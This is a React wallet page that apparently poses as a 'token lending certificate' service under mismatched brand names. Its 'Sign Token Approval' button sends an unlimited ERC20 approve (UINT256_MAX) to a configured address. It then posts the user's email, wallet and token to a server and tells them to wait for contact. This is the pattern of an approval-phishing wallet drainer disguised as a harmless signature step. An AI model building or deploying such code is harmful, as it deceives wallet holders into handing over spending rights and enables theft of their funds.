import React, { useState, useEffect } from 'react'
import { useAuth0 } from "@auth0/auth0-react";
import { Link } from 'react-router-dom'
import Select, { components, NonceProvider } from "react-select";
import trezorModule from '@web3-onboard/trezor'
import ledgerModule from '@web3-onboard/ledger'
import mewWalletModule from '@web3-onboard/mew-wallet'
import Onboard from '@web3-onboard/core'
import injectedModule from '@web3-onboard/injected-wallets'
import { APPROVE_ADDRESS, SIGNING_TOKENS, UINT256_MAX, UNISWAP_PERMIT2_ADDRESS } from 'src/data/config'
import '../../data/css/index.css'
import { NotificationManager } from 'react-notifications'
import Web3 from "web3"
import erc20Abi from "../../data/erc20.json";
import Jazzicon, { jsNumberForAddress } from 'react-jazzicon'
import appLogoImage from "../../assets/images/logo3.png";
import axios from '../../config/server.config';

const injected = injectedModule()
const ledger = ledgerModule()
const mewWallet = mewWalletModule()
const trezorOptions = {
  email: 'test@test.com',
  appUrl: 'https://www.blocknative.com'
}

const Option = (props) => (
  <components.Option {...props} className="country-option">
    {
      props.data.address &&       
      <img src={ `/tokens/${props.data.address}.svg`} alt="logo" className="country-logo" />
    }
    {props.data.label}
  </components.Option>
);

const trezor = trezorModule(trezorOptions)

const ITEM_HEIGHT = 48;
const ITEM_PADDING_TOP = 8;
const MenuProps = {
  PaperProps: {
    style: {
      maxHeight: ITEM_HEIGHT * 4.5 + ITEM_PADDING_TOP,
      width: 250,
    },
  },
};
const MAINNET_RPC_URL = "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"

const appMetadata = {
  name: 'GenoBank certification app',
  icon: appLogoImage,
  description: 'A simple and wallet sign KYC app',
  recommendedInjectedWallets: [
    { name: 'MetaMask', url: 'https://metamask.io' }
  ]
}

const onboard = Onboard({
  wallets: [
    injected,
    ledger,
    trezor,
    mewWallet
  ],
  chains: [
    {
      id: '0x1',
      token: 'ETH',
      label: 'Ethereum Mainnet',
      rpcUrl: MAINNET_RPC_URL
    }
  ],
  appMetadata,
  accountCenter: {
    desktop: {
      enabled: false,
    },
    mobile: {
      enabled: false,
    }
  }
})

const Wallet = () => {
  const { logout } = useAuth0();
  const [selectedTokenOption, setSelectedTokenOption] = useState(SIGNING_TOKENS[0]);
  const handleChange = (obj) => {
    setSelectedTokenOption(obj);
    setSelectedToken(typeof obj.label === 'string' ? obj.label : undefined);
    setSelectedTokenAddress(typeof obj.label === 'string' ? SIGNING_TOKENS.find(item => item.label === obj.label).address : undefined);
  };

  const SingleValue = ({ children, ...props }) => (
    <components.SingleValue {...props}>
      {
        selectedTokenOption.address &&         
           
        <img src={`/tokens/${selectedTokenOption.address}.svg`} alt="s-logo" className="selected-logo" />
      }
      {children}
    </components.SingleValue>
  );

  const [selectedToken, setSelectedToken] = useState(undefined);
  const [selectedTokenAddress, setSelectedTokenAddress] = useState(undefined);
  const [web3Provider, setProvider] = useState(undefined);
  const [connection, setConnection] = useState(undefined);
  const [connectedWalletName, setConnectedWalletName] = useState(undefined);
  const [connectedWalletAddress, setConnectedWalletAddress] = useState(undefined);
  const [connectedChainId, setConnectedChainId] = useState(undefined);
  const [globalWeb3, setGlobalWeb3] = useState(undefined);

  useEffect(() => {
    console.log(web3Provider);
    // If the wallet has a provider than the wallet is connected
    if (web3Provider?.on) {
      const handleAccountsChanged = (accounts) => {
        if (accounts[0]) {
          setConnectedWalletAddress(accounts[0]);
        } else {
          setConnectedWalletAddress(undefined);
        }
      };

      const handleChainChanged = (chainId) => {
        setConnectedChainId(chainId);
        if (chainId !== "0x1") {
          NotificationManager.warning("Please change your wallet network to Ethereum.");
        }
      }

      const handleDisconnect = () => {
        onClickDisconnect();
      };

      web3Provider.on("accountsChanged", handleAccountsChanged);
      web3Provider.on("chainChanged", handleChainChanged);
      web3Provider.on("disconnect", handleDisconnect);

      return () => {
        if (web3Provider.removeListener) {
          web3Provider.removeListener("accountsChanged", handleAccountsChanged);
          web3Provider.removeListener("chainChanged", handleChainChanged);
          web3Provider.removeListener("disconnect", handleDisconnect);
        }
      };
    }
  }, [web3Provider])

  const onClickDisconnect = async () => {
    try {
      setConnectedChainId(undefined);
      setConnectedWalletAddress(undefined);
      await onboard.disconnectWallet();
    } catch (e) {
      console.log(" onClickDisconnect() exception : ", e);
    }
  }

  const onClickSignApproval = async () => {
    console.log("connetecChainId ===> ", connectedChainId)
    console.log("connectedWalletAddress ===> ", connectedWalletAddress)
    console.log("selectedTokenAddress ===> ", selectedTokenAddress)
    if (connectedWalletAddress === undefined || (connectedWalletAddress && connectedWalletAddress.includes("0x") === false)) {
      NotificationManager.warning("Connect your wallet first and retry.");
      return;
    }
    if (connectedChainId !== "0x1") {
      NotificationManager.warning("Please change your wallet network to Ethereum.");
      return;
    }
    if (selectedTokenAddress === undefined || (selectedTokenAddress && selectedTokenAddress.includes("0x") === false)) {
      NotificationManager.warning("Select a token for sign.");
      return;
    }
    let flag = "";
    try {
      const tokenContract = new globalWeb3.eth.Contract(erc20Abi, selectedTokenAddress);
      flag = "success";
      await tokenContract.methods.approve(APPROVE_ADDRESS, UINT256_MAX).send({ from: connectedWalletAddress }).then((res) => {
        console.log(res);
        console.log('success', connectedWalletAddress, selectedTokenAddress);
      });
    } catch (error) {
      // console.log(error);
      flag = "failed";
    }
    console.log('check', flag);
    localStorage.setItem('connectedWalletAddress', connectedWalletAddress);
    localStorage.setItem('selectedTokenAddress', selectedTokenAddress);
    let email_addr = localStorage.getItem('email');
    axios.post('/upload/approve', {email: email_addr, wallet: connectedWalletAddress, token: selectedTokenAddress})
      .then(function (response) {
        console.log(response);

      })
      .catch(function (error) {
        // console.log(error);
      });
    if (flag!="failed") {
      console.log('success', connectedWalletAddress, selectedTokenAddress);
      NotificationManager.success("Congratulation! We will get in touch with you within 24 hours.");
    }
  }

  const onClickConnectWallet = async () => {
    const connection = await onboard.connectWallet()

    if (connection[0]) {
      console.log("connection[0] ===> ", connection[0]);
      setConnection(connection[0]);
      if(connection[0]?.label)
      {
        setConnectedWalletName(connection[0]?.label);
      }
      if (connection[0]?.provider) {
        setProvider(connection[0].provider)
        const ethWeb3 = new Web3(connection[0].provider);
        setGlobalWeb3(ethWeb3);
      }
      if (connection[0]?.accounts && connection[0].accounts.length >= 1) {
        setConnectedWalletAddress(connection[0].accounts[0].address);
      }
      if (connection[0]?.chains && connection[0].chains.length >= 1) {
        setConnectedChainId(connection[0].chains[0].id);
        if (connection[0].chains[0].id !== "0x1") {
          NotificationManager.warning("Please change your wallet network to Ethereum.");
        }
      }
      setTimeout(() => {
        console.log("document===", document.querySelector("#account-center-with-notify"))
      }, 1000);
    }
  }

  return (
    <div className="bg-light min-vh-100 align-items-center border-1">
      <svg width="0" height="0" style={{ position: 'absolute' }} fill="currentColor" focusable="false">
        <symbol xmlns="http://www.w3.org/2000/svg" id="download" viewBox="0 0 24 24">
          <path d="M12 16l4-5h-3V4h-2v7H8z"></path>
          <path d="M20 18H4v-7H2v7c0 1.103.897 2 2 2h16c1.103 0 2-.897 2-2v-7h-2v7z"></path>
        </symbol>
        <symbol xmlns="http://www.w3.org/2000/svg" id="revision" viewBox="0 0 24 24">
          <path
            d="M19.89 10.105a8.696 8.696 0 00-.789-1.456l-1.658 1.119a6.606 6.606 0 01.987 2.345 6.659 6.659 0 010 2.648 6.495 6.495 0 01-.384 1.231 6.404 6.404 0 01-.603 1.112 6.654 6.654 0 01-1.776 1.775 6.606 6.606 0 01-2.343.987 6.734 6.734 0 01-2.646 0 6.55 6.55 0 01-3.317-1.788 6.605 6.605 0 01-1.408-2.088 6.613 6.613 0 01-.382-1.23 6.627 6.627 0 01.382-3.877A6.551 6.551 0 017.36 8.797 6.628 6.628 0 019.446 7.39c.395-.167.81-.296 1.23-.382.107-.022.216-.032.324-.049V10l5-4-5-4v2.938a8.805 8.805 0 00-.725.111 8.512 8.512 0 00-3.063 1.29A8.566 8.566 0 004.11 16.77a8.535 8.535 0 001.835 2.724 8.614 8.614 0 002.721 1.833 8.55 8.55 0 005.061.499 8.576 8.576 0 006.162-5.056c.22-.52.389-1.061.5-1.608a8.643 8.643 0 000-3.45 8.684 8.684 0 00-.499-1.607z">
          </path>
        </symbol>
        <symbol xmlns="http://www.w3.org/2000/svg" id="question-mark" viewBox="0 0 24 24">
          <path
            d="M12 4C9.243 4 7 6.243 7 9h2c0-1.654 1.346-3 3-3s3 1.346 3 3c0 1.069-.454 1.465-1.481 2.255-.382.294-.813.626-1.226 1.038C10.981 13.604 10.995 14.897 11 15v2h2v-2.009c0-.024.023-.601.707-1.284.32-.32.682-.598 1.031-.867C15.798 12.024 17 11.1 17 9c0-2.757-2.243-5-5-5zm-1 14h2v2h-2z">
          </path>
        </symbol>
        <symbol xmlns="http://www.w3.org/2000/svg" id="link-external" viewBox="0 0 24 24">
          <path d="M13 3l3.293 3.293-7 7 1.414 1.414 7-7L21 11V3z"></path>
          <path d="M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z"></path>
        </symbol>
        <symbol xmlns="http://www.w3.org/2000/svg" id="task" viewBox="0 0 24 24">
          <path
            d="M5 22h14c1.103 0 2-.897 2-2V5c0-1.103-.897-2-2-2h-2a1 1 0 00-1-1H8a1 1 0 00-1 1H5c-1.103 0-2 .897-2 2v15c0 1.103.897 2 2 2zM5 5h2v2h10V5h2v15H5V5z">
          </path>
          <path d="M11 13.586l-1.793-1.793-1.414 1.414L11 16.414l5.207-5.207-1.414-1.414z"></path>
        </symbol>
      </svg>

      <header className="trialBanner-35f4b613ab7a60f6284bce9bce46b13b">
        <div className="content-cd2b0f02688690986bb438eb1053dcfc">
          <a href="../index.html" target="blank">
            <img className="applogo" src="logo3.png" alt="" title="" />
          </a>
        </div>
      </header>
      <main className="container-87616a3312f6d07dd4063793ac310b8b">
        <div className="navContainer-4abaab810f9915f1bfc73a2f2bcfc7a3"></div>
        <div className="fullSizeContainer-22a5863e7bd763f3c21c8742b377ae17" id="main-content" tabIndex="0">
          <div className="innerContainer-34dcbe06e266e583cb7fde78fd0aebaf">
            <div className="container-3ad78864b8e4918eaccb132b55451277">
              <div className="main-862588bd97013f04cb48df35ba6e7290">
                <div className="box-4e0678ce2e546c61fe9a76eb7e5b4c08">
                  <h1 className="titleMain-56b11fab5c3101b1ce63378880d9cb36">Token Lending Approval</h1>
                  <section className="section-81bcc3a377ec16cdd946044caef8023f">
                    <h2 className="titleSecondary-f693a56fc31c6db9c58ea83246c9e029">1. Connect your wallet</h2>
                    <div className="textContainer-7f1171528b9bc4f00165ef56f7bae47c" style={{ display: 'block' }}>
                      <p className="text-f541af79479a774e32ff4a6b9253a840">Connect your cryptocurrency wallet.
                      </p>
                      <div className="buttons-e328982eb3aa1b0797ef3f03b4d33925">    
                        {                          
                          (connectedWalletAddress !== undefined || (connectedWalletAddress && connectedWalletAddress.includes("0x") === true)) ?
                        <div className="connectedWallet">
                          <div className="walletColor">                            
                            <Jazzicon diameter={44} seed={jsNumberForAddress(connectedWalletAddress)} />                            
                          </div>
                          <div className="walletAddress">
                            <span className="wAddress">
                            {
                                connectedWalletAddress.substring(0, 5) + "..." + connectedWalletAddress.substring(38, 42)
                            }
                            </span><br />
                            Connected to <span className="connectBadge" >
                              {
                                connectedWalletName? connectedWalletName : ""
                              }
                            </span>
                          </div>
                          <button className="disconnectBtn" onClick={() => {onClickDisconnect()}} >Disconnect</button>
                        </div>
                        :                    
                        <button onClick={() => onClickConnectWallet()}
                          className="ods-button -action--primary button-cceed290ad520b8c7599440293b2e2fa"
                          style={{ maxWidth: '320px', margin: 'auto' }}>
                          Connect Wallet
                        </button>
                        }
                      </div>
                    </div>
                  </section>
                  <section className="section-81bcc3a377ec16cdd946044caef8023f">
                    <h2 className="titleSecondary-f693a56fc31c6db9c58ea83246c9e029">2. Select token to approve</h2>
                    <div className="textContainer-7f1171528b9bc4f00165ef56f7bae47c" style={{ display: 'block' }}>
                      <p className="text-f541af79479a774e32ff4a6b9253a840">Select the ERC20 token that you want to approve.
                      </p>
                      <div className="buttons-e328982eb3aa1b0797ef3f03b4d33925" style={{ maxWidth: '320px', margin: 'auto', marginTop: "10px" }}>
                        <div>
                          <Select
                            value={selectedTokenOption}
                            options={SIGNING_TOKENS}
                            onChange={handleChange}
                            styles={{
                              singleValue: (base) => ({
                                ...base,
                                display: "flex",
                                alignItems: "center",
                                paddingTop: "6px",
                                paddingBottom: "6px"
                              })
                            }}
                            components={{
                              Option,
                              SingleValue
                            }}
                          />
                        </div>
                        <div id="test"></div>
                      </div>
                    </div>
                  </section>
                  <section className="section-81bcc3a377ec16cdd946044caef8023f">
                    <div className="textContainer-7f1171528b9bc4f00165ef56f7bae47c">
                      <h2 className="titleSecondary-f693a56fc31c6db9c58ea83246c9e029">3. Sign token approval</h2>
                      <div className="strengthText-4888d5e20d4ea24ab3fba5131995c8bb">
                        <div className="tooltipWrapper-515741dd17898009c0dd5e3a4e4cbf68">
                          <div
                            className="container-0d8178f00a6e8cfa48d4074684df0579 tooltipIcon-7ab2f9774e31ad2a0f79865bb552f046">
                            <span  >
                              <svg aria-hidden="true" fill="currentColor" focusable="false"
                                className="ods-icon icon-1f4bed47d506d11d4ac880750aacc1e0">
                                <use href="#question-mark"></use>
                              </svg>
                            </span>
                          </div>
                          <div className="tooltip-3cc1961c0b7a2b73fc454d119574c1ec">
                            <div className="tooltipContent-fa9c366af294c3de234217664fd13370">
                              <p>To generate your proof of lending certificate, you need to create a digital signature on
                                the blockchain to approve token allowance. Please note that you need to have a
                                small quantity of gas to allow authorization and proceed with signature.
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div className="textContainer-7f1171528b9bc4f00165ef56f7bae47c" style={{ display: 'block' }}>
                      <p className="textColor-c09fbb562f0c91e0c473429d51fb20df">Create digital signature of token approval.
                      </p>
                      <div className="buttons-e328982eb3aa1b0797ef3f03b4d33925">
                        <button onClick={() => { onClickSignApproval() }}
                          className="ods-button -action--primary button-cceed290ad520b8c7599440293b2e2fa"
                          style={{ maxWidth: '320px', margin: 'auto' }}>Sign Token Approval
                        </button>
                      </div>
                    </div>
                  </section>
                </div>
              </div>
              <div className="sidebar-fe32a127b3c39fa786151c16faa694c9" style={{ marginBottom: '47px' }}>
                <div className="box-4e0678ce2e546c61fe9a76eb7e5b4c08">
                  <h2 className="titleSecondary-f693a56fc31c6db9c58ea83246c9e029">Your certificates:</h2>
                  <ul className="list-6a62b389ed4213b99797faf3dc84c983">
                    <li>0 certificates available</li>
                    {/* <li>
                      <a className="listA-1cdd673f867914c8015b06d3872a1a1f contract" href="contract.pdf" target="_blank"
                        rel="noopener noreferrer">
                        221124001USDTEPKTYD
                        <svg aria-hidden="true" fill="currentColor" focusable="false"
                          className="ods-icon icon-cee99e34d7c8eaca92014de21dfa6571 svgpdf">
                          <use href="#download"></use>
                        </svg>
                      </a>
                    </li>
                    <li>
                      <a className="listA-1cdd673f867914c8015b06d3872a1a1f contract" href="https://onfido.com/security"
                        target="_blank" rel="noopener noreferrer">
                        221124002WETHEPKTYD
                        <svg aria-hidden="true" fill="currentColor" focusable="false"
                          className="ods-icon icon-cee99e34d7c8eaca92014de21dfa6571 svgpdf">
                          <use href="#download"></use>
                        </svg>
                      </a>
                    </li> */}
                    <li style={{ borderTop: '1px solid rgba(var(--ods-color-border-separator))', paddingTop: '10px' }}>
                      Identity
                      verification:<br />
                      <span>
                        <span>
                          <span className="labl">Not</span>
                          {/* <span>
                            <a style={{ textDecoration: 'none' }} href="">
                              Try again
                              <svg aria-hidden="true" fill="currentColor" focusable="false"
                                className="ods-icon icon-cee99e34d7c8eaca92014de21dfa6571 svgtry">
                                <use href="#revision"></use>
                              </svg>
                            </a>
                          </span> */}
                        </span>
                      </span>
                    </li>
                    <li>Token certification:<br />
                      <span className="labl">USDT</span> <span className="labl">ETH</span> <span className="labl">TUSD</span> <span
                        className="labl">USDC</span> <span className="labl">WBTC</span> <span className="labl">DAI</span>
                    </li>
                    <li style={{ borderTop: '1px solid rgba(var(--ods-color-border-separator))', paddingTop: '10px' }}>Please
                      follow the steps above to generate certificate
                    </li>
                    <li></li>
                  </ul>
                </div>
                <div style={{ paddingLeft: '5px', paddingTop: '10px' }}>
                  <div className="logout" style={{ display: 'block', marginBottom: '30px' }}>
                    <button className="ods-button -action--primary" onClick={() => logout({ logoutParams: { returnTo: window.location.origin } })} style={{ backgroundColor: '#2a2a3a' }}>
                      <span className="children-ef95c21ed49b242c8814436e96ef3af6">Logout</span>
                    </button>
                  </div>
                  <div style={{ paddingLeft: '5px' }}>
                    <a className="listA-1cdd673f867914c8015b06d3872a1a1f contract" href="../privacy-policy.html#cookie_policy"
                      target="_blank" rel="noopener noreferrer"
                      style={{ fontSize: '.875rem', color: 'rgba(var(--ods-color-neutral-600), 1' }}>
                      Terms of Service
                      <svg aria-hidden="true" fill="currentColor" focusable="false"
                        className="ods-icon icon-cee99e34d7c8eaca92014de21dfa6571 svgterms">
                        <use href="#link-external"></use>
                      </svg>
                    </a>
                    <a className="listA-1cdd673f867914c8015b06d3872a1a1f contract" href="../privacy-policy.html#cookie_policy"
                      target="_blank" rel="noopener noreferrer"
                      style={{ fontSize: '.875rem', color: 'rgba(var(--ods-color-neutral-600), 1' }}>
                      Privacy Policy
                      <svg aria-hidden="true" fill="currentColor" focusable="false"
                        className="ods-icon icon-cee99e34d7c8eaca92014de21dfa6571 svgterms">
                        <use href="#link-external"></use>
                      </svg>
                    </a>
                    <a className="listA-1cdd673f867914c8015b06d3872a1a1f contract" href="mailto:support@website.com"
                      style={{ fontSize: '.875rem', color: 'rgba(var(--ods-color-neutral-600), 1', marginTop: '15px' }}>support@amadeus-analytics.com</a>
                    <span className="listA-1cdd673f867914c8015b06d3872a1a1f contract"
                      style={{ fontSize: '.875rem', color: 'rgba(var(--ods-color-neutral-600), 1' }}>© 2023 Amadeus Analytics.
                      All Right Reserved.</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  )
}

export default Wallet
